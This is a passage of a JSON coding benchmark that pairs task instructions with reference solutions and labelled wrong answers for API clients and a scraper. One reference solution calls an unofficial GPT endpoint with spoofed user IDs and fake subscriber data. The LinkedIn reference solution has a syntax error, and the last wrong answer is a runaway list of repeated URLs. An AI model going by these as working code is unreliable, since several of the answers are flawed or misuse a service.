progress_bar.n != total_size:\n        raise Exception(\"Download failed\")\n\n    os.rename(cache_path + '.tmp', cache_path)\n    with open(metadata_path, 'w') as f:\n        f.write(f\"{url}\\t{response.headers.get('etag', '')}\")\n\n    return cache_path\n```"
  },
  {
    "Task_id": 89,
    "Instruction": "Task Description: Create a Python function that interacts with a GPT API endpoint to generate completions based on given messages, handling the HTTP request and response process.\n\nFunction Description: The function `_create_completion` sends a POST request to a specified GPT API endpoint with formatted messages and randomly generated user data. It processes the response to extract and yield the assistant's message content if the request is successful.\n\nInput:\n- model: str - The GPT model to use (e.g., 'gpt-3.5-turbo')\n- messages: list - A list of message dictionaries, each containing 'role' and 'content' keys\n- stream: bool - A flag indicating whether to stream the response (not used in this implementation)\n- **kwargs: Additional optional arguments\n\nOutput:\n- Generator[str, None, None] - Yields the assistant's message content if the request is successful\n- None - Returns None if an error occurs during the request",
    "Canonical_solution": "import os\nimport requests\nimport json\nimport random\nimport time\nimport string\nfrom ...typing import sha256, Dict, get_type_hints\n\nurl = \"https://wewordle.org/gptapi/v1/android/turbo\"\nmodel = ['gpt-3.5-turbo']\nsupports_stream = False\nneeds_auth = False\n\ndef _create_completion(model: str, messages: list, stream: bool, **kwargs):\n    base = ''\n    for message in messages:\n        base += '%s: %s\\n' % (message['role'], message['content'])\n    base += 'assistant:'\n    _user_id = ''.join(random.choices(\n        f'{string.ascii_lowercase}{string.digits}', k=16))\n    _app_id = ''.join(random.choices(\n        f'{string.ascii_lowercase}{string.digits}', k=31))\n    _request_date = time.strftime(\"%Y-%m-%dT%H:%M:%S.000Z\", time.gmtime())\n    headers = {\n        'accept': '*/*',\n        'pragma': 'no-cache',\n        'Content-Type': 'application/json',\n        'Connection': 'keep-alive'\n    }\n    data = {\n        \"user\": _user_id,\n        \"messages\": [\n            {\"role\": \"user\", \"content\": base}\n        ],\n        \"subscriber\": {\n            \"originalPurchaseDate\": None,\n            \"originalApplicationVersion\": None,\n            \"allPurchaseDatesMillis\": {},\n            \"entitlements\": {\n                \"active\": {},\n                \"all\": {}\n            },\n            \"allPurchaseDates\": {},\n            \"allExpirationDatesMillis\": {},\n            \"allExpirationDates\": {},\n            \"originalAppUserId\": f\"$RCAnonymousID:{_app_id}\",\n            \"latestExpirationDate\": None,\n            \"requestDate\": _request_date,\n            \"latestExpirationDateMillis\": None,\n            \"nonSubscriptionTransactions\": [],\n            \"originalPurchaseDateMillis\": None,\n            \"managementURL\": None,\n            \"allPurchasedProductIdentifiers\": [],\n            \"firstSeen\": _request_date,\n            \"activeSubscriptions\": []\n        }\n    }\n    response = requests.post(url, headers=headers, data=json.dumps(data))\n    if response.status_code == 200:\n        _json = response.json()\n        if 'message' in _json:\n            message_content = _json['message']['content']\n            message_content = message_content.replace('**assistant:** ', '')\n            yield message_content\n    else:\n        print(f\"Error Occurred::{response.status_code}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport json\nimport random\nimport requests\n\ndef _create_completion(model, messages, stream=False, **kwargs):\n    url = 'https://api.openai.com/v1/chat/completions'\n    headers = {\n        'Content-Type': 'application/json',\n        'Authorization': f'Bearer {random.choice([\"YOUR_API_KEY_1\", \"YOUR_API_KEY_2\"])}'  # Replace with your actual API keys\n    }\n    data = {\n        'model': model,\n        'messages': messages,\n        'stream': stream,\n        **kwargs\n    }\n    try:\n        response = requests.post(url, headers=headers, data=json.dumps(data))\n        response.raise_for_status()\n        for choice in response.json().get('choices', []):\n            yield choice['message']['content']\n    except requests.exceptions.RequestException as e:\n        print(f'Error: {e}')\n        return None\n```"
  },
  {
    "Task_id": 91,
    "Instruction": "Task Description: Create a Python class to interact with the Cal.com API for managing bookings, available time slots, and timezone conversions.\n\nClass Description: The CalComAPI class provides methods to interact with Cal.com's API v2 for scheduling operations. It handles authentication, timezone conversions, and provides functionality to check available slots, create/reschedule/cancel bookings, and view upcoming bookings.\n\nAttributes:\napi_key: str - The API key for authenticating with Cal.com's API\nevent_type_id: int - The event type ID for which bookings are managed\nuser_timezone: str - The timezone to display times to users (default: \"America/New_York\")\n\nMethods:\n_convert_to_user_timezone(utc_time: str) -> str - Converts UTC time string to user's local timezone\n_get_headers(api_version: str = \"2024-08-13\") -> Dict[str, str] - Returns authorization headers for API requests\nget_available_slots(start_date: str, end_date: str) -> str - Retrieves available booking slots between dates\ncreate_booking(start_time: str, name: str, email: str) -> str - Creates a new booking with attendee details\nget_upcoming_bookings(email: str) -> str - Retrieves upcoming bookings for an attendee\nreschedule_booking(booking_uid: str, new_start_time: str, reason: str) -> str - Reschedules an existing booking\ncancel_booking(booking_uid: str, reason: str) -> str - Cancels an existing booking",
    "Canonical_solution": "import requests\nimport pytz\nfrom typing import Dict, Optional\nfrom datetime import datetime\n\nclass CalComAPI:\n    def __init__(self, api_key: str, event_type_id: int, user_timezone: str = \"America/New_York\"):\n        self.api_key = api_key\n        self.event_type_id = event_type_id\n        self.user_timezone = user_timezone\n\n    def _convert_to_user_timezone(self, utc_time: str) -> str:\n        utc_dt = datetime.fromisoformat(utc_time.replace(\"Z\", \"+00:00\"))\n        user_tz = pytz.timezone(self.user_timezone)\n        user_dt = utc_dt.astimezone(user_tz)\n        return user_dt.strftime(\"%Y-%m-%d %H:%M %Z\")\n\n    def _get_headers(self, api_version: str = \"2024-08-13\") -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"cal-api-version\": api_version,\n            \"Content-Type\": \"application/json\",\n        }\n\n    def get_available_slots(self, start_date: str, end_date: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/slots/available\"\n            querystring = {\n                \"startTime\": f\"{start_date}T00:00:00Z\",\n                \"endTime\": f\"{end_date}T23:59:59Z\",\n                \"eventTypeId\": self.event_type_id,\n            }\n\n            response = requests.get(url, headers=self._get_headers(), params=querystring)\n            if response.status_code == 200:\n                slots = response.json()[\"data\"][\"slots\"]\n                available_slots = []\n                for date, times in slots.items():\n                    for slot in times:\n                        user_time = self._convert_to_user_timezone(slot[\"time\"])\n                        available_slots.append(user_time)\n                return f\"Available slots: {', '.join(available_slots)}\"\n            return f\"Failed to fetch slots: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def create_booking(self, start_time: str, name: str, email: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/bookings\"\n            start_time = datetime.fromisoformat(start_time).astimezone(pytz.utc).isoformat(timespec=\"seconds\")\n            payload = {\n                \"start\": start_time,\n                \"eventTypeId\": self.event_type_id,\n                \"attendee\": {\"name\": name, \"email\": email, \"timeZone\": self.user_timezone},\n            }\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 201:\n                booking_data = response.json()[\"data\"]\n                user_time = self._convert_to_user_timezone(booking_data[\"start\"])\n                return f\"Booking created successfully for {user_time}. Booking uid: {booking_data['uid']}\"\n            return f\"Failed to create booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def get_upcoming_bookings(self, email: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/bookings\"\n            querystring = {\"status\": \"upcoming\", \"attendeeEmail\": email}\n\n            response = requests.get(url, headers=self._get_headers(), params=querystring)\n            if response.status_code == 200:\n                bookings = response.json()[\"data\"]\n                if not bookings:\n                    return \"No upcoming bookings found.\"\n\n                booking_info = []\n                for booking in bookings:\n                    user_time = self._convert_to_user_timezone(booking[\"start\"])\n                    booking_info.append(\n                        f\"uid: {booking['uid']}, Title: {booking['title']}, Time: {user_time}, Status: {booking['status']}\"\n                    )\n                return \"Upcoming bookings:\\n\" + \"\\n\".join(booking_info)\n            return f\"Failed to fetch bookings: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def reschedule_booking(self, booking_uid: str, new_start_time: str, reason: str) -> str:\n        try:\n            url = f\"https://api.cal.com/v2/bookings/{booking_uid}/reschedule\"\n            new_start_time = datetime.fromisoformat(new_start_time).astimezone(pytz.utc).isoformat(timespec=\"seconds\")\n            payload = {\"start\": new_start_time, \"reschedulingReason\": reason}\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 201:\n                booking_data = response.json()[\"data\"]\n                user_time = self._convert_to_user_timezone(booking_data[\"start\"])\n                return f\"Booking rescheduled to {user_time}. New booking uid: {booking_data['uid']}\"\n            return f\"Failed to reschedule booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def cancel_booking(self, booking_uid: str, reason: str) -> str:\n        try:\n            url = f\"https://api.cal.com/v2/bookings/{booking_uid}/cancel\"\n            payload = {\"cancellationReason\": reason}\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 200:\n                return \"Booking cancelled successfully.\"\n            return f\"Failed to cancel booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nfrom datetime import datetime\nfrom typing import Dict, List, Optional\nimport requests\nimport pytz\n\nclass CalComAPI:\n    def __init__(self, api_key: str, event_type_id: int, user_timezone: str = \"America/New_York\"):\n        self.api_key = api_key\n        self.event_type_id = event_type_id\n        self.user_timezone = user_timezone\n\n    def _convert_to_user_timezone(self, utc_time: str) -> str:\n        utc_time = datetime.strptime(utc_time, \"%Y-%m-%dT%H:%M:%S%z\")\n        user_tz = pytz.timezone(self.user_timezone)\n        user_time = utc_time.astimezone(user_tz)\n        return user_time.strftime(\"%Y-%m-%d %H:%M:%S\")\n\n    def _get_headers(self, api_version: str = \"2024-08-13\") -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"Accept\": f\"application/json; version={api_version}\"\n        }\n\n    def get_available_slots(self, start_date: str, end_date: str) -> str:\n        url = f\"https://api.cal.com/v2/event-types/{self.event_type_id}/availability\"\n        headers = self._get_headers()\n        params = {\n            \"start\": start_date,\n            \"end\": end_date\n        }\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()\n\n    def create_booking(self, start_time: str, name: str, email: str) -> str:\n        url = f\"https://api.cal.com/v2/bookings\"\n        headers = self._get_headers()\n        data = {\n            \"eventTypeId\": self.event_type_id,\n            \"startTime\": start_time,\n            \"name\": name,\n            \"email\": email\n        }\n        response = requests.post(url, headers=headers, json=data)\n        return response.json()\n\n    def get_upcoming_bookings(self, email: str) -> str:\n        url = f\"https://api.cal.com/v2/bookings\"\n        headers = self._get_headers()\n        params = {\n            \"email\": email\n        }\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()\n\n    def reschedule_booking(self, booking_uid: str, new_start_time: str, reason: str) -> str:\n        url = f\"https://api.cal.com/v2/bookings/{booking_uid}\"\n        headers = self._get_headers()\n        data = {\n            \"startTime\": new_start_time,\n            \"rescheduleReason\": reason\n        }\n        response = requests.patch(url, headers=headers, json=data)\n        return response.json()\n\n    def cancel_booking(self, booking_uid: str, reason: str) -> str:\n        url = f\"https://api.cal.com/v2/bookings/{booking_uid}\"\n        headers = self._get_headers()\n        data = {\n            \"cancelReason\": reason\n        }\n        response = requests.delete(url, headers=headers, json=data)\n        return response.json()\n```"
  },
  {
    "Task_id": 95,
    "Instruction": "Task Description: Implement a LinkedIn API toolkit class that provides functionality to interact with LinkedIn's API for creating posts, deleting posts, and retrieving user profile information.\n\nClass Description: The LinkedInToolkit class encapsulates LinkedIn API operations including post creation, post deletion, and profile retrieval. It handles authentication using an access token and manages API requests and responses.\n\nAttributes:\n_access_token: str - Stores the LinkedIn API access token retrieved from environment variables.\n\nMethods:\n__init__() -> None - Initializes the LinkedInToolkit instance by obtaining the access token.\ncreate_post(text: str) -> Dict - Creates a new LinkedIn post with the given text content.\ndelete_post(post_id: str) -> str - Deletes a LinkedIn post specified by its post ID.\nget_profile(include_id: bool = False) -> Dict - Retrieves the user's LinkedIn profile information.\n_get_access_token() -> str - Private method to retrieve the LinkedIn access token from environment variables.",
    "Canonical_solution": "import json\nimport os\nfrom http import HTTPStatus\nfrom typing import List, Dict\nimport requests\n\nclass LinkedInToolkit:\n    def __init__(self):\n        self._access_token = self._get_access_token()\n\n    def create_post(self, text: str) -> Dict:\n        url = 'https://api.linkedin.com/v2/ugcPosts'\n        urn = self.get_profile(include_id=True)\n\n        headers = {\n            'X-Restli-Protocol-Version': '2.0.0',\n            'Content-Type': 'application/json',\n            'Authorization': f'Bearer {self._access_token}',\n        }\n\n        post_data = {\n            \"author\": urn['id'],\n            \"lifecycleState\": \"PUBLISHED\",\n            \"specificContent\": {\n                \"com.linkedin.ugc.ShareContent\": {\n                    \"shareCommentary\": {\"text\": text},\n                    \"shareMediaCategory\": \"NONE\",\n                }\n            },\n            \"visibility\": {\n                \"com.linkedin.ugc.MemberNetworkVisibility\": \"PUBLIC\"\n            },\n        }\n\n        response = requests.post(\n            url, headers=headers, data=json.dumps(post_data)\n        if response.status_code == 201:\n            post_response = response.json()\n            post_id = post_response.get('id', None)\n            return {'Post ID': post_id, 'Text': text}\n        else:\n            raise Exception(\n                f\"Failed to create post. Status code: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n    def delete_post(self, post_id: str) -> str:\n        headers = {\n            \"Authorization\": f'Bearer {self._access_token}',\n            \"Content-Type\": \"application/json\",\n        }\n\n        response = requests.delete(\n            f\"https://api.linkedin.com/v2/ugcPosts/{post_id}\",\n            headers=headers,\n        )\n\n        if response.status_code != HTTPStatus.NO_CONTENT:\n            return (\n                f\"Request returned error: \"\n                f\"{response.status_code} {response.text}\"\n            )\n\n        return f\"Post deleted successfully. Post ID: {post_id}.\"\n\n    def get_profile(self, include_id: bool = False) -> Dict:\n        headers = {\n            \"Authorization\": f'Bearer {self._access_token}',\n            'Connection': 'Keep-Alive',\n            'Content-Type': 'application/json',\n            \"X-Restli-Protocol-Version\": \"2.0.0\",\n        }\n\n        response = requests.get(\n            \"https://api.linkedin.com/v2/userinfo\",\n            headers=headers,\n        )\n\n        if response.status_code != HTTPStatus.OK:\n            raise Exception(\n                f\"Failed to retrieve profile. \"\n                f\"Status code: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n        json_response = response.json()\n\n        locale = json_response.get('locale', {})\n        country = locale.get('country', 'N/A')\n        language = locale.get('language', 'N/A')\n\n        profile_report = {\n            \"Country\": country,\n            \"Language\": language,\n            \"First Name\": json_response.get('given_name'),\n            \"Last Name\": json_response.get('family_name'),\n            \"Email\": json_response.get('email'),\n        }\n\n        if include_id:\n            profile_report['id'] = f\"urn:li:person:{json_response['sub']}\"\n\n        return profile_report\n\n    def _get_access_token(self) -> str:\n        token = os.getenv(\"LINKEDIN_ACCESS_TOKEN\")\n        if not token:\n            return \"Access token not found. Please set LINKEDIN_ACCESS_TOKEN.\"\n        return token",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nfrom typing import Dict\n\nclass LinkedInToolkit:\n    def __init__(self) -> None:\n        self._access_token = self._get_access_token()\n\n    def create_post(self, text: str) -> Dict:\n        url = \"https://api.linkedin.com/v2/ugcPosts\"\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\",\n            \"Content-Type\": \"application/json\"\n        }\n        data = {\n            \"author\": f\"urn:li:person:{os.environ['LINKEDIN_USER_ID']}\",\n            \"lifecycleState\": \"PUBLISHED\",\n            \"specificContent\": {\n                \"com.linkedin.ugc.ShareContent\": {\n                    \"shareComment\": text,\n                    \"shareMediaCategory\": \"NONE\"\n                }\n            },\n            \"visibility\": {\n                \"com.linkedin.ugc.MemberNetworkVisibility\": \"PUBLIC\"\n            }\n        }\n        response = requests.post(url, headers=headers, json=data)\n        return response.json()\n\n    def delete_post(self, post_id: str) -> str:\n        url = f\"https://api.linkedin.com/v2/ugcPosts/{post_id}\"\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\"\n        }\n        response = requests.delete(url, headers=headers)\n        return response.text\n\n    def get_profile(self, include_id: bool = False) -> Dict:\n        url = f\"https://api.linkedin.com/v2/me\"\n        params = {\n            \"projection\": \":(id,firstName,lastName,profilePicture(displayImage~:playableStreams))\"\n        }\n        if include_id:\n            params[\"projection\"] += \",:(id)\"\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\"\n        }\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()\n\n    def _get_access_token(self) -> str:\n        return os.environ[\"LINKEDIN_ACCESS_TOKEN\"]\n```"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Scrape SHA256 hashes from Hugging Face dataset pages and save them to a file.\n\nFunction Description: This function scrapes SHA256 hashes from a series of Hugging Face dataset pages by making HTTP GET requests to each page, parsing the HTML content to extract the hashes, and writing them to an output file along with their corresponding filenames. It also prints the collected hashes to the console.\n\nInput: None (The function uses hardcoded URLs and output filename)\n\nOutput: \n1. Writes to \"shard_hashes.txt\" file with format: \"[filename] [SHA256 hash]\"\n2. Prints collected SHA256 hashes to console with format: \"SHA256 hash [index]: [hash]\"\n3. Prints error messages for failed requests or missing hashes",
    "Canonical_solution": "import requests\nimport re\n\ndef scrape_huggingface_hashes():\n    base_url = 'https://huggingface.co/datasets/EleutherAI/pythia_deduped_pile_idxmaps/blob/main/pile_0.87_deduped_text_document-'\n    sha256_list = []\n\n    with open(\"shard_hashes.txt\", \"w\") as output_file:\n        for i in range(83):\n            page_number = f\"{i:05d}-of-00082.bin\"\n            url = base_url + page_number\n            file_name = url.split('/')[-1]\n\n            response = requests.get(url)\n\n            if response.status_code == 200:\n                html_content = response.text\n                matches = re.findall(r'<strong>SHA256:</strong>\\s*([\\da-fA-F]+)', html_content)\n\n                if matches:\n                    sha256_list.extend(matches)\n                    for sha256 in matches:\n                        output_file.write(f\"{file_name} {sha256}\\n\")\n                else:\n                    print(f\"No hash found for file: {file_name}\")\n            else:\n                print(f\"Failed to fetch HTML content from {url}. Status code: {response.status_code}\")\n\n    for idx, sha256 in enumerate(sha256_list, start=1):\n        print(f\"SHA256 hash {idx}: {sha256}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom bs4 import BeautifulSoup\nimport hashlib\n\ndef scrape_sha256_hashes():\n    urls = [\n        \"https://huggingface.co/datasets/facebook/pmd\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        \"https://huggingface.co/datasets/facebook/pmd/resolve/main/README.md\",\n        